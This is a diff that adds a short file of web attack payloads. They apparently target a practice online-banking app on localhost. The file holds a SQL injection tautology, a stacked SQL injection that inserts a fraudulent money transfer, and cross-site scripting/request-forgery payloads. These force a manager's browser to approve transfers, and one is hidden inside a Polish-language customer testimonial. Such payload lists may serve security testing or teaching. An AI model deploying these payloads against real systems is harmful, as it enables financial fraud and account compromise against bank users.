@@ -1,0 +1,5 @@
+Paliwo' OR '1'='1
+Paliwo';INSERT INTO onlinebank_transfer ('from_account_id', 'to_account', 'title', 'amount', 'date') VALUES ('1', '69696969696969696969696969', 'MATKA6969', '6969.69', '2018-11-11 19:10:41.414855');--
+
+<script>window.location.href = 'http://127.0.0.1:8000/manager/accept?from_account_id=1'</script>
+<b>Beata z Kędzierzyna</b><p>Bardzo lubię ten bank</p><img src='http://127.0.0.1:8000/manager/accept?from_account_id=1'>
